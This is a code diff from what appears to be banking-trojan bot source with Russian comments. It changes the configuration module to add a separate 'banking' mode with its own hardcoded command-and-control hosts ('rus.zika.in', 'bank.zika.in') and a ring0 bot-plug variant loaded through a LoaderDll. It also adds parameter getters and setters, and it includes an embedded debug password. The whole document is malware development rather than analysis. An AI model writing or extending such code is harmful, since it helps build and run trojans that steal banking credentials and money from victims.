@@ -66,7 +66,13 @@ namespace CONFIGDEBUGSTRINGS
 	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
 	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/
 
-
+	//----------------------------------------------------------------------------
+	// Имя бот плага.
+	// Будет передаватся от LoaderDll в ботплаг.
+	// Параметр необходим для выполнения команды обновления плага. 
+	// В самом ботплаге нет информации из какого файла его подгрузили.
+	//----------------------------------------------------------------------------
+	char BotPlugName[MAX_BOT_PLUG_NAME_SIZE] = BOTPARAM_PLUG_NAME;
 //=============================================================================
 #else
 
@@ -80,7 +86,7 @@ namespace CONFIGDEBUGSTRINGS
 
 	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
 
-	char BOT_BANKHOSTS_ARRAY[] = "bank.zika.in\0";
+	char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "bank.zika.in\0";
 
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
 	char BOT_PREFIX[]     = "BSSTEST";
@@ -90,9 +96,17 @@ namespace CONFIGDEBUGSTRINGS
 
 
 //----------------------------------------------------------------------------
-// Префикс бота работающего в режиме Банк
+// Префикс бота работающего в режиме Banking
+//
+// В борке bot.plug, ring0 версия, банкинг префикс отличается от префикса
+// в ring3 версии
 //----------------------------------------------------------------------------
-char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
+
+#ifndef BOTPLUG
+	char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
+#else
+	char BOT_PREFIX_BANK[] = {'b','k','b','a','n','k','i','n','g', 0};
+#endif
 
 
 
@@ -193,7 +207,7 @@ char *GetPrefix(bool CheckBankingMode)
 {
 	// Функция возвращает префикс бота
 
-		// Проверяем режим режим работы
+		// Проверяем режим работы
 
 	if (CheckBankingMode && IsBankingMode())
 		return BOT_PREFIX_BANK;
@@ -330,6 +344,7 @@ int GetDelay()
 
 
 //-----------------------------------------------------------------------------
+/*
 PCHAR GetActiveHost()
 {
 	// Функция возвращает активный (доступный) хост
@@ -349,10 +364,10 @@ PCHAR GetActiveHost()
 
 	return GetActiveHostFromBuf(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS);
 
-}
+}  */
 //-----------------------------------------------------------------------------
 
-string GetActiveHost2()
+string GetActiveHost(bool CheckBankingMode)
 {
 	// Функция возвращает активный (доступный) хост
 	#ifndef DEBUGCONFIG
@@ -367,7 +382,29 @@ string GetActiveHost2()
 			return Result;
 		}
 	#endif
-	return GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
+
+
+	// Проверяем режим банкинга
+	PCHAR Hosts;
+	DWORD Hash;
+	bool  Encrypted;
+
+
+	if (CheckBankingMode && IsBankingMode())
+	{
+		Hosts     = BOT_BANKHOSTS_ARRAY;
+		Encrypted = BOTPARAM_ENCRYPTED_BANKHOSTS;
+		Hash      = BOTPARAM_HASH_BANKHOSTS;
+	}
+	else
+	{
+		Hosts     = BOT_MAINHOSTS_ARRAY;
+		Encrypted = BOTPARAM_ENCRYPTED_MAINHOSTS;
+		Hash      = BOTPARAM_HASH_MAINHOSTS;
+    }
+
+
+	return GetActiveHostFromBuf2(Hosts, Hash, Encrypted);
 }
 //-----------------------------------------------------------------------------
 
@@ -444,7 +481,7 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 
 //-----------------------------------------------------------------------------
 
-PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
+PCHAR GetBotScriptURL(DWORD Script, PCHAR Path, bool CheckBankingMode)
 {
 	// Функция возвращает полный адрес скрипта
 	bool PathCreated = false;
@@ -457,20 +494,18 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 	CFGDBG("Cofig", "Путь скрипта %s", Path);
 
 
-
-	PCHAR Host = GetActiveHost();
-
 	PCHAR Result = NULL;
 
-	if (Host != NULL)
+	string Host = GetActiveHost(CheckBankingMode);
+
+	if (!Host.IsEmpty())
 	{
 		PCHAR Slash = NULL;
 		if (Path == NULL || *Path != '/')
         	Slash = "/";
 
-		Result = STR::New(4, (PCHAR)HTTPProtocol, Host, Slash, Path);
+		Result = STR::New(4, (PCHAR)HTTPProtocol, Host.t_str(), Slash, Path);
 
-		STR::Free(Host);
 		CFGDBG("Cofig", "Адрес скрипта: %s", Result);
 	}
 	else
@@ -492,20 +527,39 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 //  GetBankingScriptURL-  Функция возвращает адрес
 //		скрипта с проверкой включенного режима Banking
 //-----------------------------------------------------
-string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
+/*string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
 {
 	string Host;
-	if (CheckBankingMode && IsBankingMode())
+
+
+	#ifndef DEBUGCONFIG
+		PCHAR H  = NULL;
+
+		// Первым этапом пытаемся получить хост из файла
+		if (Hosts::GetActiveHostFormFile(NULL, H))
+		{
+			CFGDBG("Cofig", "Получили хост из файла");
+			Host = H;
+			STR::Free(H);
+		}
+	#endif
+
+
+	if (Host.IsEmpty())
 	{
-		Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
-									 BOTPARAM_HASH_BANKHOSTS,
-									 BOTPARAM_ENCRYPTED_BANKHOSTS);
-	}
-	else
-	{
-		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
-									 BOTPARAM_HASH_MAINHOSTS,
-									 BOTPARAM_ENCRYPTED_MAINHOSTS);
+		// Получаем хосты из вшитых данных
+		if (CheckBankingMode && IsBankingMode())
+		{
+			Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
+										 BOTPARAM_HASH_BANKHOSTS,
+										 BOTPARAM_ENCRYPTED_BANKHOSTS);
+		}
+		else
+		{
+			Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
+										 BOTPARAM_HASH_MAINHOSTS,
+										 BOTPARAM_ENCRYPTED_MAINHOSTS);
+		}
     }
 
 	string URL;
@@ -523,6 +577,7 @@ string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
 	}
 	return URL;
 }
+*/
 //----------------------------------------------------------------------------
 
 
@@ -589,19 +644,22 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 
 	#ifdef DEBUGCONFIG
 		switch (ParamID) {
-			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
-			case BOT_PARAM_KEY:    Value = DebugPassword; break;
-			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
-		default: return 0;;
+			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
+			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
+			case BOT_PARAM_KEY:          Value = DebugPassword; break;
+			case BOT_PARAM_DELAY:        Value = DebugDelay; break;
+			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
+		default: return 0;
 		}
 	#else
 		switch (ParamID) {
-			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
-			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
-			case BOT_PARAM_KEY:    Value = MainPassword; break;
-			case BOT_PARAM_DELAY:  Value = Delay; break;
-		default: return 0;;
+			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
+			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
+			case BOT_PARAM_KEY:          Value = MainPassword; break;
+			case BOT_PARAM_DELAY:        Value = Delay; break;
+			case BOT_PARAM_BOTPLUGNAME:  Value = BotPlugName; break;
+			case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
+		default: return 0;
 		}
 	#endif
 
@@ -611,13 +669,12 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 	// Лпределяем размер параметра
 	DWORD Size = 0;
 
-	if (ParamID == BOT_PARAM_HOSTS)
+	bool ParamIsHosts = ParamID == BOT_PARAM_HOSTS ||
+						ParamID == BOT_PARAM_BANKINGHOSTS;
+
+	if (ParamIsHosts)
 	{
-		#ifdef DEBUGCONFIG
-			 Size = StrCalcLength(Value) + 2;
-		#else
-			 Size = STR::CalcDoubleZeroStrLength(Value);
-		#endif
+		Size = STR::CalcDoubleZeroStrLength(Value);
 	}
 	else
 		Size = StrCalcLength(Value);
@@ -632,7 +689,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 
 	if (BufSize < Size)
 	{
-		if (ParamID == BOT_PARAM_HOSTS)
+		if (ParamIsHosts)
             Size = BufSize - 2;
 		else
 			Size = BufSize - 1;
@@ -640,18 +697,11 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 
 	DWORD ToCopy = Size;
 
-
-	#ifdef DEBUGCONFIG
-		if (ParamID == BOT_PARAM_HOSTS)
-			ToCopy -= 2;
-	#endif
-
     m_memcpy(Buffer, Value, ToCopy);
-
 
 	#ifdef DEBUGCONFIG
 		// Шифруем открытые данные
-		if (ParamID == BOT_PARAM_HOSTS ||
+		if (ParamIsHosts ||
 			ParamID == BOT_PARAM_PREFIX ||
 			ParamID == BOT_PARAM_KEY)
 		{
@@ -713,6 +763,23 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 				{
 					Buf = Delay;
 					Max = MAX_DELAY_SIZE;
+					break;
+				}
+
+			// Устанавливаем имя плага
+			case BOT_PARAM_BOTPLUGNAME:
+				{
+					Buf = BotPlugName;
+					Max = MAX_BOT_PLUG_NAME_SIZE;
+					break;
+				}
+
+
+			// Устанавливаем хосты BANKING режима
+			case BOT_PARAM_BANKINGHOSTS:
+				{
+					Buf = BOT_BANKHOSTS_ARRAY;
+					Max = MAX_BANKHOSTS_BUF_SIZE;
 					break;
 				}
 
